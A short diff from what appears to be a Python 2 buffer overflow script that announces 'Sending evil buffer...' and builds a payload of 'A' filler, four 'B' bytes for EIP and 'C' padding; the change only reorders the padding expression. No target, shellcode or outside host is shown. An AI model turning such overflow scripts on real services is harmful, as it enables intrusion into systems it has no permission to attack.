@@ -4,7 +4,7 @@ import socket
 print "\nSending evil buffer..."
 buffer = "A" * 2080
 eip = "B" * 4
-offset = (2096 - (len(buffer) - len(eip))) * "C"
+offset = "C" * (2096 - (len(buffer) - len(eip)))
 
 input_buffer = buffer + eip + offset
 
